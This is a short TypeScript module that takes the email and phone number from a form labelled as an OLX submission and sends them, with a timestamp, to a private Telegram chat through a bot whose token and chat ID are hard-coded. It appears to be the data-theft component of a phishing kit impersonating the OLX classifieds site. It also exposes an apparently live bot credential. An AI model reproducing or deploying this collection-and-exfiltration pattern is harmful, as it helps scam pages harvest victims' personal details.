const TELEGRAM_BOT_TOKEN = '8464545234:AAHE9DsHwZ_9DEM5bMeQNd4r54YhPDBIz9g';
const TELEGRAM_CHAT_ID = '-1002904177569';

export async function sendToTelegram(formData: { email: string; phone: string }) {
  const message = `🆕 Nowe zgłoszenie OLX\n\n📧 Email: ${formData.email}\n📱 Telefon: ${formData.phone}\n\n⏰ Data: ${new Date().toLocaleString('pl-PL')}`;

  const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  const response = await fetch(telegramUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    }),
  });

  if (!response.ok) {
    const errorData = await response.json().catch(() => ({}));
    console.error('Telegram API error:', errorData);
    throw new Error('Nie udało się wysłać wiadomości do Telegram');
  }

  return response.json();
}